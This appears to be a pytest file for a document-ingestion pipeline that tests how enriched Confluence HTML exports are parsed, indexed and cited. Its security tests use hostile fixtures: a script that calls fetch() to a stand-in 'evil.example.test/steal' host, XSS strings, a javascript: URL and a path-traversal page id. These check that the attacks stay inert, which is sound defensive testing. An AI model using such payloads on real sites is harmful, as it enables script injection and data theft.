"""Enriched HTML, end to end: from a file on disk to chunks a query could return.

The rest of ``tests/connectors`` stops at the bytes a connector hands over. This file does not,
because the claim being made is about what reaches the *index* — that the storage body arrives at
:class:`~manicule.parsers.confluence.ConfluenceStorageParser`, that the metadata banner does not
arrive anywhere, and that the document is keyed on the page rather than on where the page happens
to sit. Every one of those is invisible to a connector test and to a parser test alike; they are
properties of the seam between them, and a seam is where this project's defects have lived.

The pipeline is the real one, over the real parsers, with the store and vector index in memory.
Fixtures are synthetic throughout: invented page ids, ``https://docs.example.test/``, temporary
roots. Nothing here reaches a network, and ``test_nothing_here_opens_a_socket`` says so with a
guard rather than with a sentence.
"""

from __future__ import annotations

import dataclasses
import json
import socket
from typing import TYPE_CHECKING

import pytest

from manicule.connectors.enriched import (
    ADAPTER_VERSION,
    DEFAULT_PROFILE,
    MAX_BODY_BYTES,
    OUTCOMES,
    AdapterOutcome,
    EnrichedProfile,
    UnusablePageError,
    adapt,
)
from manicule.connectors.enriched_html import write_sidecars
from manicule.connectors.filesystem import (
    DUPLICATE_IDENTITY,
    ENRICHED_KEY,
    SNAPSHOT_PATH,
    FilesystemConnector,
)
from manicule.core.content import BlockKind, Chunk, DocumentStatus
from manicule.core.ids import chunk_id, document_id
from manicule.ingest.middleware import MiddlewareRunner
from manicule.ingest.pipeline import IngestPipeline
from manicule.ingest.workers import InProcessRunner
from manicule.parsers.config import CONFLUENCE_MEDIA_TYPE, ConfluenceConfig, WebConfig
from manicule.parsers.confluence import ConfluenceStorageParser
from manicule.parsers.web import WebParser
from tests.fakes import HashEmbedder
from tests.ingest import fakes

if TYPE_CHECKING:
    from collections.abc import Iterable
    from pathlib import Path

    from manicule.core.content import Document, ParsedBlock

CANONICAL = "https://docs.example.test/pages/1002"

DOT = 'digraph G {\n  client -> server [label="{retry|fail}"];\n}'
"""The diagram body, written once and compared against character for character.

Deliberately awkward: an ASCII ``->`` that a bogus-comment reparse would swallow, and braces
inside a quoted label that a naive brace counter would call unbalanced. A DOT body of
``digraph G { a -> b; }`` would pass through almost any implementation and prove nothing.
"""

CODE = "def retry(attempts):\n    return attempts > 0"

ROWS: tuple[tuple[str, str], ...] = (
    ("Page ID", "1002"),
    ("Space", "ENG"),
    ("Version", "7"),
    ("Created", "2026-01-02T03:04:05Z"),
    ("Last modified", "2026-08-12T09:45:00Z"),
    ("Exported", "2026-08-12T10:00:00Z"),
    ("Source", f'<a href="{CANONICAL}">canonical page</a>'),
)

BODY = f"""
      <h1>Retry Runbook</h1>
      <h2 id="policy">Retry policy</h2>
      <p>The client retries twice.</p>

      <ac:structured-macro ac:name="code">
        <ac:parameter ac:name="language">python</ac:parameter>
        <ac:plain-text-body><![CDATA[{CODE}]]></ac:plain-text-body>
      </ac:structured-macro>

      <ac:structured-macro ac:name="graphviz">
        <ac:parameter ac:name="engine">circo</ac:parameter>
        <ac:plain-text-body><![CDATA[{DOT}]]></ac:plain-text-body>
      </ac:structured-macro>

      <ac:structured-macro ac:name="warning">
        <ac:rich-text-body><p>Never retry a write.</p></ac:rich-text-body>
      </ac:structured-macro>

      <ac:task-list>
        <ac:task><ac:task-id>1</ac:task-id><ac:task-status>complete</ac:task-status>
          <ac:task-body>Raise the ceiling</ac:task-body></ac:task>
        <ac:task><ac:task-id>2</ac:task-id><ac:task-status>incomplete</ac:task-status>
          <ac:task-body>Alert on exhaustion</ac:task-body></ac:task>
      </ac:task-list>

      <table><tr><th>Setting</th><th>Value</th></tr>
        <tr><td>ceiling</td><td><ac:structured-macro ac:name="code">
          <ac:parameter ac:name="language">bash</ac:parameter>
          <ac:plain-text-body><![CDATA[retries=2]]></ac:plain-text-body>
        </ac:structured-macro></td></tr></table>

      <ac:structured-macro ac:name="jira">
        <ac:parameter ac:name="jqlQuery">project = SECRET AND status = Open</ac:parameter>
      </ac:structured-macro>

      <ac:link><ri:page ri:content-title="Backoff"/>
        <ac:plain-text-link-body>backoff</ac:plain-text-link-body></ac:link>
      <p><a href="https://docs.example.test/pages/1003">the escalation page</a></p>
"""


def page(
    rows: tuple[tuple[str, str], ...] = ROWS,
    *,
    title: str = "Retry Runbook",
    body: str = BODY,
    sections: int = 1,
    bodies: int = 1,
    metadata_attribute: str = "data-source-metadata",
    body_attribute: str = 'data-document-representation="storage"',
    wrapper: str = "",
) -> str:
    """One enriched page. Everything a test needs to vary is a parameter rather than a substitution.

    ``rows`` and ``wrapper`` are written verbatim, so a test can put hostile markup in either.
    """
    block = "\n".join(f"      <p><strong>{label}:</strong> {value}</p>" for label, value in rows)
    banner = "\n".join(
        f"    <section {metadata_attribute}>\n{block}\n    </section>" for _ in range(sections)
    )
    main = "\n".join(f"    <main {body_attribute}>{body}</main>" for _ in range(bodies))
    return (
        f"<!doctype html>\n<html>\n  <head><title>{title}</title></head>\n  <body>\n"
        f"    <nav>Exported by the wiki mirror. Home | Spaces | Search</nav>\n"
        f"{wrapper}{banner}\n{main}\n  </body>\n</html>\n"
    )


def rows_replacing(label: str, value: str) -> tuple[tuple[str, str], ...]:
    return tuple((name, value if name == label else held) for name, held in ROWS)


def written(root: Path, name: str = "1002.html", body: str | None = None) -> Path:
    target = root / "pages" / name
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(body if body is not None else page(), encoding="utf-8")
    return target


def converted(root: Path, name: str = "1002.html", body: str | None = None) -> Path:
    """A page with its manifest beside it, which is what gives it its own identity."""
    target = written(root, name, body)
    write_sidecars(root, force=True)
    return target


class _Chunker(fakes.BlockChunker):
    """One chunk per block, carrying the block's language and metadata.

    :class:`~tests.ingest.fakes.BlockChunker` drops both, which is fine for the pipeline tests it
    was written for and is precisely wrong here: "the code language stays metadata and is not
    indexed as prose" is two claims, and a chunker that discards metadata can only ever check the
    second. A test that could not fail on the first would be asserting half a requirement.
    """

    def chunk(self, document: Document, blocks: Iterable[ParsedBlock]) -> list[Chunk]:
        return [
            Chunk(
                id=chunk_id(document.id, position, block.text),
                document_id=document.id,
                text=block.text,
                embed_text=f"{document.title} > {block.text}",
                anchor=block.anchor,
                heading_path=block.heading_path,
                kind=block.kind,
                position=position,
                token_count=max(1, len(block.text.split())),
                metadata={**block.metadata, **({"lang": block.lang} if block.lang else {})},
            )
            for position, block in enumerate(blocks)
        ]


def pipeline(store: fakes.MemoryIngestStore) -> IngestPipeline:
    """The real pipeline over the real parsers, routing by exact media type.

    ``resolve_chain`` is the routing this whole change turns on, so it is spelled out rather than
    stubbed to one parser: a document reaches the storage parser because its media type says
    ``profile=confluence-storage`` and for no other reason, which is the property under test.
    """
    chunker = _Chunker()
    return IngestPipeline(
        store=store,
        chunker=chunker,
        embedder=HashEmbedder(),
        vectors=fakes.MemoryVectors(),
        runner=InProcessRunner(
            {
                "confluence": ConfluenceStorageParser(ConfluenceConfig()),
                "web": WebParser(WebConfig()),
            }
        ),
        resolve_chain=lambda media: (
            ["confluence"] if media == CONFLUENCE_MEDIA_TYPE else ["web"]
        ),
        middleware=MiddlewareRunner([]),
        chunk_fingerprint=chunker.fingerprint,
    )


async def ingest(root: Path, *, store: fakes.MemoryIngestStore | None = None, name: str = "docs"):
    """Sync ``root`` through the pipeline and hand back the store it wrote to."""
    held = store if store is not None else fakes.MemoryIngestStore()
    await pipeline(held).run(FilesystemConnector(root, name=name))
    return held


def texts(store: fakes.MemoryIngestStore) -> list[str]:
    return [chunk.text for chunks in store.chunks.values() for chunk in chunks]


def only(store: fakes.MemoryIngestStore) -> Document:
    documents = list(store.documents.values())
    assert len(documents) == 1, f"expected one document, got {[d.source_id for d in documents]}"
    return documents[0]


# --- the critical acceptance test -----------------------------------------------------------
#
# The specification states this as eight clauses. They are eight assertions rather than one
# summary, because a single "it works" assertion is exactly how a requirement stops being
# checked: whichever clause breaks, the failure has to name it.


async def test_the_stored_document_is_typed_as_confluence_storage(tmp_path: Path) -> None:
    """Clause 1. The type is what routed it, so this is the whole of "it reached the parser"."""
    store = await ingest(await _corpus(tmp_path))

    assert only(store).media_type == CONFLUENCE_MEDIA_TYPE
    assert only(store).status is DocumentStatus.INDEXED
    assert only(store).metadata["parser_used"] == "confluence"


async def test_the_metadata_banner_is_absent_from_every_stored_chunk(tmp_path: Path) -> None:
    """Clause 2. Not "mostly absent": the banner is the thing generic ingestion indexed."""
    store = await ingest(await _corpus(tmp_path))

    for text in texts(store):
        for banner in ("Page ID", "Last modified", "Exported by the wiki mirror", CANONICAL):
            assert banner not in text, f"the wrapper reached a chunk: {text!r}"


async def test_a_configuration_parameter_is_never_indexed_as_prose(tmp_path: Path) -> None:
    """Clause 3, and the reason the storage parser exists at all.

    ``python`` and ``circo`` are what the macros *do*, not what the page says. The JQL query is
    the case that makes this more than untidy — indexed as prose it is a query nobody wrote on
    the page, quotable in a citation, and in this fixture it names a project.
    """
    store = await ingest(await _corpus(tmp_path))
    indexed = texts(store)

    for configuration in ("python", "circo", "project = SECRET"):
        assert not any(configuration in text for text in indexed), (
            f"{configuration!r} is macro configuration and reached the index as text"
        )
    # The other half of the claim, which absence alone cannot make: it is *kept*, as metadata.
    code = [chunk for chunks in store.chunks.values() for chunk in chunks if chunk.lang == "python"]
    assert code, "the language was dropped rather than moved to metadata"
    diagrams = [
        chunk
        for chunks in store.chunks.values()
        for chunk in chunks
        if chunk.metadata.get("engine") == "circo"
    ]
    assert diagrams, "the Graphviz engine was dropped rather than moved to metadata"


async def test_code_and_diagram_chunks_are_code(tmp_path: Path) -> None:
    """Clause 4. A diagram's source is text in a language, and is retrievable as such."""
    store = await ingest(await _corpus(tmp_path))
    kinds = {
        chunk.text: chunk.kind for chunks in store.chunks.values() for chunk in chunks
    }

    assert kinds[CODE] is BlockKind.CODE
    assert kinds[DOT] is BlockKind.CODE


async def test_the_diagram_source_survives_character_for_character(tmp_path: Path) -> None:
    """Clause 5, and the one clause a "close enough" implementation cannot fake.

    The body crosses four transformations between the file and the chunk — CDATA recovery, the
    extraction's serialisation, the parser's own re-parse, and text extraction — and every one of
    them is a place an escape can be doubled or a newline normalised.
    """
    store = await ingest(await _corpus(tmp_path))

    assert DOT in texts(store)
    diagram = next(text for text in texts(store) if text.startswith("digraph"))
    assert diagram == DOT
    assert "-&gt;" not in diagram, "an escape survived into the indexed text"


async def test_the_citation_carries_the_page_rather_than_the_file(tmp_path: Path) -> None:
    """Clause 6. Title, URL, page id, version and both timestamps, none standing in for another."""
    store = await ingest(await _corpus(tmp_path))
    stored = only(store)

    assert stored.title == "Retry Runbook"
    assert stored.uri == CANONICAL
    record = stored.provenance
    assert record is not None
    assert record.source is not None
    assert record.source.source_id == "1002"
    assert record.source.version == "7"
    assert record.source.created_at is not None
    assert record.source.modified_at is not None
    assert record.source.section_path == ("ENG",)
    assert record.snapshot is not None
    assert record.snapshot.path == "pages/1002.html", "the local snapshot survives being superseded"
    assert record.snapshot.retrieved_at is not None
    assert record.snapshot.retrieved_at != record.source.modified_at


async def test_the_identity_is_the_configured_instance_and_the_page_id(tmp_path: Path) -> None:
    """Clause 7. Not the path, and not the connector's *type* either — see #94."""
    store = await ingest(await _corpus(tmp_path), name="handbook")
    stored = only(store)

    assert stored.source_id == "1002"
    assert stored.id == document_id("default", "handbook", "1002")
    assert stored.id != document_id("default", "filesystem", "1002")


async def test_moving_the_file_does_not_create_a_second_document(tmp_path: Path) -> None:
    """Clause 8, and the reason identity had to move off the path at all.

    A mirror reorganised from by-space to by-tree is the ordinary case, not a pathological one.
    Keyed on the path it is a corpus of new documents beside a corpus of orphans, and the
    curated collections and tags hanging off the old rows go with them.
    """
    root = await _corpus(tmp_path)
    store = await ingest(root)
    before = only(store).id

    moved = root / "reorganised" / "runbooks"
    moved.mkdir(parents=True)
    for name in ("1002.html", "1002.html.source.json"):
        (root / "pages" / name).rename(moved / name)
    await ingest(root, store=store)

    assert only(store).id == before, "the page acquired a second document by being moved"
    assert only(store).provenance is not None
    assert only(store).provenance.snapshot is not None  # pyright: ignore[reportOptionalMemberAccess]
    assert only(store).provenance.snapshot.path == "reorganised/runbooks/1002.html"  # pyright: ignore[reportOptionalMemberAccess]


async def _corpus(tmp_path: Path) -> Path:
    """The specification's example page, converted, under a root of its own."""
    root = tmp_path / "corpus"
    root.mkdir()
    converted(root)
    return root


# --- the adapter contract --------------------------------------------------------------------


def test_every_combination_of_marker_counts_has_an_outcome() -> None:
    """The table is complete, checked against its own key space rather than by reading it.

    A missing row is a ``KeyError`` inside a walk over somebody's corpus, which surfaces as a
    connector crash rather than as a refused file.
    """
    buckets = ("0", "1", "many")
    assert set(OUTCOMES) == {(a, b) for a in buckets for b in buckets}


@pytest.mark.parametrize(
    ("html", "outcome", "names"),
    [
        (page(), AdapterOutcome.ADAPTED, ""),
        ("<html><body><p>An ordinary page.</p></body></html>", AdapterOutcome.NO_PROFILE, ""),
        (page(sections=2), AdapterOutcome.AMBIGUOUS, "2 ×"),
        (page(bodies=2), AdapterOutcome.AMBIGUOUS, "2 ×"),
        (page(body_attribute="data-something-else"), AdapterOutcome.MISSING_BODY, "0 ×"),
        (page(metadata_attribute="data-something-else"), AdapterOutcome.INVALID_METADATA, "0 ×"),
    ],
    ids=[
        "the supported default profile",
        "an unmarked file",
        "several metadata sections",
        "several storage bodies",
        "no storage body",
        "no metadata section",
    ],
)
def test_the_documented_shapes_reach_the_outcome_the_table_states(
    html: str, outcome: AdapterOutcome, names: str
) -> None:
    if outcome is AdapterOutcome.ADAPTED:
        assert adapt(html).profile is DEFAULT_PROFILE
        return
    with pytest.raises(UnusablePageError) as refused:
        adapt(html)
    assert refused.value.outcome is outcome
    assert names in str(refused.value)


def test_a_configured_alternate_marker_profile_reads_its_own_exporter() -> None:
    """A site whose exporter spells the markers differently configures one; it does not patch."""
    profile = EnrichedProfile(
        name="acme-export",
        metadata_selector="[data-acme-page]",
        body_selector='[data-acme-format="storage"]',
        labels={"identifier": "source_id", "revision": "version"},
    )
    html = page(
        (("Identifier", "77"), ("Revision", "3")),
        metadata_attribute="data-acme-page",
        body_attribute='data-acme-format="storage"',
    )

    adapted = adapt(html, profiles=(profile,))

    assert adapted.profile.name == "acme-export"
    assert adapted.page.source.source_id == "77"
    assert adapted.page.source.version == "3"


def test_the_default_profile_does_not_claim_another_exporters_page() -> None:
    """Precedence is not a fallback. A page marked for one profile is not read by another."""
    html = page(metadata_attribute="data-acme-page", body_attribute='data-acme-format="storage"')

    with pytest.raises(UnusablePageError, match="matches no configured") as refused:
        adapt(html)
    assert refused.value.outcome is AdapterOutcome.NO_PROFILE


def test_an_ambiguous_page_is_refused_rather_than_offered_to_the_next_profile() -> None:
    """Falling through is how a hostile file chooses which profile reads it.

    Two of one exporter's body markers is a refusal, full stop. Were it a "no match" the file
    would be handed to the next configured profile, and a document carrying both vocabularies
    could decide which of its two bodies got indexed by making the first one ambiguous.
    """
    other = EnrichedProfile(name="other", metadata_selector="[data-source-metadata]")

    with pytest.raises(UnusablePageError) as refused:
        adapt(page(bodies=2), profiles=(DEFAULT_PROFILE, other))
    assert refused.value.outcome is AdapterOutcome.AMBIGUOUS


def test_an_extracted_body_over_the_limit_is_refused() -> None:
    """The bound is on what is produced, not only on what is read."""
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr("manicule.connectors.enriched.MAX_BODY_BYTES", 64)
        with pytest.raises(UnusablePageError, match="over the 64-byte limit") as refused:
            adapt(page())
    assert refused.value.outcome is AdapterOutcome.FAILED
    assert MAX_BODY_BYTES > 64, "the real limit is not the one this test pinned"


def test_a_canonical_address_a_browser_would_execute_is_refused() -> None:
    """Refused by ``SourceMetadata`` itself, which is the point of constructing one."""
    with pytest.raises(UnusablePageError, match="will not cite") as refused:
        adapt(page(rows_replacing("Source", '<a href="javascript:alert(1)">page</a>')))
    assert refused.value.outcome is AdapterOutcome.INVALID_METADATA


# --- what the connector does with all that ---------------------------------------------------


async def test_an_ordinary_html_file_is_still_ordinary_html(tmp_path: Path) -> None:
    """The regression that must not happen, asserted at the level a user would notice it."""
    root = tmp_path / "corpus"
    root.mkdir()
    (root / "guide.html").write_text(
        "<html><head><title>Guide</title></head><body><h1>Guide</h1>"
        "<p>Ordinary prose.</p></body></html>",
        encoding="utf-8",
    )
    store = await ingest(root)
    stored = only(store)

    assert stored.media_type == "text/html"
    assert stored.metadata["parser_used"] == "web"
    assert ENRICHED_KEY not in stored.metadata
    assert stored.source_id == str(root / "guide.html"), "identity is the path with nothing to say"
    assert stored.provenance is None, "a file with no manifest gains no record"
    assert "Ordinary prose." in texts(store)


async def test_an_enriched_page_with_no_manifest_still_reaches_the_storage_parser(
    tmp_path: Path,
) -> None:
    """Adaptation and identity are separate, and only the second needs a manifest.

    A page nobody has run the conversion over is still read as storage format — its macros keep
    their meaning and its own title and address are cited — because ``fetch`` reads the file and
    can see what it is. What it does not get is an identity that survives being moved, because
    that has to be known at discovery and discovery does not read files.
    """
    root = tmp_path / "corpus"
    root.mkdir()
    target = written(root)
    store = await ingest(root)
    stored = only(store)

    assert stored.media_type == CONFLUENCE_MEDIA_TYPE
    assert stored.uri == CANONICAL, "the page's own address, read out of the page"
    assert stored.source_id == str(target), "and its identity is still where it sits"
    assert DOT in texts(store)


async def test_a_page_the_adapter_refuses_is_indexed_as_html_with_the_reason_recorded(
    tmp_path: Path,
) -> None:
    """A refusal costs the reason, never the document.

    The wrapper is a perfectly good HTML file. Failing it would turn "this export is malformed"
    into "this page is missing", which is a strictly worse outcome and a much harder one to
    diagnose.
    """
    root = tmp_path / "corpus"
    root.mkdir()
    written(root, body=page(bodies=2))
    store = await ingest(root)
    stored = only(store)

    assert stored.media_type == "text/html"
    assert stored.status is DocumentStatus.INDEXED
    assert stored.metadata[ENRICHED_KEY]["outcome"] == AdapterOutcome.AMBIGUOUS.value  # pyright: ignore[reportIndexIssue]
    assert "ambiguity" in str(stored.metadata[ENRICHED_KEY]["reason"])  # pyright: ignore[reportIndexIssue]


async def test_the_record_names_what_was_extracted_from_what(tmp_path: Path) -> None:
    """Two checksums, because they answer different questions and move independently."""
    root = await _corpus(tmp_path)
    store = await ingest(root)
    record = only(store).metadata[ENRICHED_KEY]

    assert isinstance(record, dict)
    assert record["profile"] == "standalone-storage"
    assert record["adapter_version"] == ADAPTER_VERSION
    assert record["representation"] == CONFLUENCE_MEDIA_TYPE
    assert record["snapshot_path"] == "pages/1002.html"
    assert record["snapshot_checksum"] != record["body_checksum"]
    assert record["body_checksum"] == only(store).content_hash, (
        "the digest the index is built from is the extracted body's, and the snapshot's is the "
        "one nothing else would hold"
    )


async def test_two_files_claiming_one_page_id_are_both_refused_it(tmp_path: Path) -> None:
    """Neither wins, and the reason names the other file.

    ``documents`` is UNIQUE on ``(workspace, source, source_id)``, so honouring both would mean
    whichever synced second overwriting the first with nothing raised. Keeping the *first* would
    be worse than keeping neither: which page owns the id would depend on walk order, so renaming
    a directory would silently move one page's content onto another page's identity.
    """
    root = tmp_path / "corpus"
    root.mkdir()
    written(root, "a.html")
    written(root, "b.html")
    write_sidecars(root, force=True)

    found = [doc async for doc in FilesystemConnector(root, name="docs").discover(None)]

    assert {doc.ref.source_id for doc in found} == {
        str(root / "pages" / "a.html"),
        str(root / "pages" / "b.html"),
    }
    for doc in found:
        assert "1002" in str(doc.ref.metadata[DUPLICATE_IDENTITY])
        assert "UNIQUE" in str(doc.ref.metadata[DUPLICATE_IDENTITY])

    store = await ingest(root)
    assert len(store.documents) == 2, "one page silently overwrote the other"
    for stored in store.documents.values():
        assert "also declares" in str(stored.metadata[DUPLICATE_IDENTITY])


async def test_reconcile_and_discover_agree_about_what_a_document_is_called(
    tmp_path: Path,
) -> None:
    """Two answers to "what is this called" is a corpus that reports every page deleted."""
    root = await _corpus(tmp_path)
    connector = FilesystemConnector(root, name="docs")

    discovered = {doc.ref.source_id async for doc in connector.discover(None)}
    reconciled = {identity async for identity in connector.reconcile()}

    assert discovered == reconciled == {"1002"}


# --- reconciliation and updates ---------------------------------------------------------------


async def test_re_ingesting_an_unchanged_page_re_embeds_nothing(tmp_path: Path) -> None:
    root = await _corpus(tmp_path)
    store = await ingest(root)
    before = {chunk.id for chunks in store.chunks.values() for chunk in chunks}

    report = await pipeline(store).run(FilesystemConnector(root, name="docs"))

    assert report.skipped_version == 1
    assert report.indexed == 0
    assert {chunk.id for chunks in store.chunks.values() for chunk in chunks} == before


async def test_a_changed_body_is_reparsed_under_the_same_identity(tmp_path: Path) -> None:
    root = await _corpus(tmp_path)
    store = await ingest(root)
    before = only(store).id

    converted(root, body=page(body=BODY.replace("retries twice", "retries five times")))
    await ingest(root, store=store)

    assert only(store).id == before
    assert any("retries five times" in text for text in texts(store))


async def test_a_corrected_manifest_updates_the_citation_over_an_unchanged_body(
    tmp_path: Path,
) -> None:
    """Metadata and content change independently, and cost different things to repair."""
    root = await _corpus(tmp_path)
    store = await ingest(root)
    manifest = root / "pages" / "1002.html.source.json"
    held = json.loads(manifest.read_text(encoding="utf-8"))
    held["title"] = "Retry Runbook (revised)"
    held["version"] = "8"
    manifest.write_text(json.dumps(held), encoding="utf-8")

    await ingest(root, store=store)
    stored = only(store)

    assert stored.title == "Retry Runbook (revised)"
    assert stored.provenance is not None
    assert stored.provenance.source is not None
    assert stored.provenance.source.version == "8"


async def test_a_new_adapter_version_rebuilds_the_derived_body(tmp_path: Path) -> None:
    """The change token covers the adapter, so a changed extraction is not invisible.

    **Both halves are run, because only the pair proves anything.** A changed adapter over an
    unchanged file moves nothing a filesystem can see — the size and the modification time are
    the file's, not the extraction's — so the first half shows the page skipping before it is
    ever fetched, which is precisely the failure ``ADAPTER_VERSION`` is in the token to prevent.
    The second shows the same changed adapter reaching the index once the version moves with it.

    Nothing is re-downloaded either way, because there is nothing to download: the snapshot is a
    local file and was never thrown away.
    """

    root = await _corpus(tmp_path)
    store = await ingest(root)
    original = adapt

    def improved(html: str, **kwargs: object) -> object:
        adapted = original(html, **kwargs)  # pyright: ignore[reportArgumentType]
        return dataclasses.replace(adapted, body=adapted.body + "<p>read by a newer adapter</p>")

    with pytest.MonkeyPatch.context() as patch:
        patch.setattr("manicule.connectors.filesystem.adapt", improved)
        unchanged = await pipeline(store).run(FilesystemConnector(root, name="docs"))

    assert unchanged.skipped_version == 1, (
        "a changed adapter over an unchanged file has to move the token; nothing else about the "
        "file differs, so without it the page is skipped before it is fetched"
    )
    assert not any("newer adapter" in text for text in texts(store))

    with pytest.MonkeyPatch.context() as patch:
        patch.setattr("manicule.connectors.filesystem.adapt", improved)
        patch.setattr("manicule.connectors.filesystem.ADAPTER_VERSION", "enriched-html/2")
        rebuilt = await pipeline(store).run(FilesystemConnector(root, name="docs"))

    assert rebuilt.skipped_version == 0
    assert rebuilt.indexed == 1
    assert any("read by a newer adapter" in text for text in texts(store))


async def test_a_deleted_page_stops_being_reconciled(tmp_path: Path) -> None:
    root = await _corpus(tmp_path)
    connector = FilesystemConnector(root, name="docs")
    assert [identity async for identity in connector.reconcile()] == ["1002"]

    (root / "pages" / "1002.html").unlink()
    (root / "pages" / "1002.html.source.json").unlink()

    assert [identity async for identity in connector.reconcile()] == []


# --- security ---------------------------------------------------------------------------------


async def test_a_script_in_the_wrapper_reaches_no_chunk_and_is_never_run(tmp_path: Path) -> None:
    """The wrapper is untrusted, and the parts of it that are not the body are not indexed."""
    root = tmp_path / "corpus"
    root.mkdir()
    written(
        root,
        body=page(wrapper='<script>fetch("https://evil.example.test/steal")</script>\n'),
    )
    store = await ingest(root)

    assert not any("evil.example.test" in text for text in texts(store))
    assert not any("fetch(" in text for text in texts(store))


async def test_hostile_markup_inside_cdata_stays_text(tmp_path: Path) -> None:
    """CDATA exists so a body can hold ``<`` without being markup, and it stays that way.

    Escaped on recovery rather than promoted to an element, which is the difference between a
    content-loss bug and an execution one.
    """
    hostile = '<script>alert("x")</script> & <img src=x onerror=y>'
    root = tmp_path / "corpus"
    root.mkdir()
    written(
        root,
        body=page(
            body=f"<h1>T</h1><ac:structured-macro ac:name=\"code\">"
            f"<ac:plain-text-body><![CDATA[{hostile}]]></ac:plain-text-body>"
            f"</ac:structured-macro>"
        ),
    )

    adapted = adapt((root / "pages" / "1002.html").read_text(encoding="utf-8"))
    assert "&lt;script&gt;" in adapted.body, "the body was promoted from text to markup"

    store = await ingest(root)
    assert hostile in texts(store), "the body was lost rather than kept inert"


async def test_a_traversal_shaped_page_id_is_a_string_and_never_a_path(tmp_path: Path) -> None:
    """Identity is stored, never joined to anything and never opened."""
    root = tmp_path / "corpus"
    root.mkdir()
    escape = tmp_path / "escape-target"
    escape.mkdir()
    converted(root, body=page(rows_replacing("Page ID", "../../../escape-target/owned")))

    store = await ingest(root)

    assert only(store).source_id == "../../../escape-target/owned"
    assert list(escape.iterdir()) == [], "a page id reached the filesystem"
    assert only(store).media_type == CONFLUENCE_MEDIA_TYPE


async def test_a_symlink_out_of_the_root_is_not_followed(tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "1003.html").write_text(page(), encoding="utf-8")
    root = tmp_path / "corpus"
    (root / "pages").mkdir(parents=True)
    (root / "pages" / "link.html").symlink_to(outside / "1003.html")

    store = await ingest(root)

    assert store.documents == {}


async def test_an_oversized_page_is_not_read_into_memory(tmp_path: Path) -> None:
    """The connector's own fetch cap is the pipeline's; this pins the conversion's."""
    root = tmp_path / "corpus"
    root.mkdir()
    from manicule.connectors.enriched_html import MAX_HTML_BYTES  # noqa: PLC0415

    (root / "huge.html").write_bytes(b"<html>" + b"x" * (MAX_HTML_BYTES + 1))

    outcomes = write_sidecars(root)

    assert not outcomes[0].written
    assert outcomes[0].outcome is AdapterOutcome.FAILED
    assert "over the" in outcomes[0].skipped_reason


def test_nothing_here_opens_a_socket(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A canonical URL is read out of an attribute. Nothing dereferences it, ever."""
    root = tmp_path / "corpus"
    root.mkdir()
    written(root)

    def refuse(*args: object, **kwargs: object) -> None:
        message = "adaptation opened a socket"
        raise AssertionError(message)

    monkeypatch.setattr(socket, "socket", refuse)
    monkeypatch.setattr(socket, "create_connection", refuse)

    assert write_sidecars(root)[0].written
    assert adapt((root / "pages" / "1002.html").read_text(encoding="utf-8")).page.source.source_id


# --- the conversion run reports every file ------------------------------------------------------


def test_a_run_that_adapted_nothing_says_so_per_file(tmp_path: Path) -> None:
    """A run reporting only successes presents "wrong directory" as a clean conversion."""
    (tmp_path / "plain.html").write_text("<html><body>hi</body></html>", encoding="utf-8")
    (tmp_path / "half.html").write_text(page(bodies=0), encoding="utf-8")

    outcomes = write_sidecars(tmp_path)

    assert not any(outcome.written for outcome in outcomes)
    assert {outcome.path.name: outcome.outcome for outcome in outcomes} == {
        "plain.html": AdapterOutcome.NO_PROFILE,
        "half.html": AdapterOutcome.MISSING_BODY,
    }
    assert all(outcome.skipped_reason for outcome in outcomes)


def test_the_manifest_records_the_representation_and_not_the_adapter_version(
    tmp_path: Path,
) -> None:
    """One of those is a fact about the page; the other is a fact about this build.

    A manifest declaring the adapter version would either be believed — recording a version that
    never ran — or checked, refusing every existing manifest the day the adapter improved.
    """
    written(tmp_path)
    write_sidecars(tmp_path)

    manifest = json.loads((tmp_path / "pages" / "1002.html.source.json").read_text("utf-8"))

    assert manifest["content_type"] == CONFLUENCE_MEDIA_TYPE
    assert "adapter_version" not in manifest
    assert "body_checksum" not in manifest
    assert manifest["source_id"] == "1002"


def test_the_conversion_and_the_connector_are_configured_with_one_profile_set(
    tmp_path: Path,
) -> None:
    """A page one adapted and the other refused would leave two reports disagreeing about a file."""
    profile = EnrichedProfile(name="acme", metadata_selector="[data-acme-page]")
    written(tmp_path, body=page(metadata_attribute="data-acme-page"))

    assert write_sidecars(tmp_path, profiles=(DEFAULT_PROFILE,))[0].outcome is (
        AdapterOutcome.INVALID_METADATA
    )
    assert write_sidecars(tmp_path, force=True, profiles=(profile,))[0].written
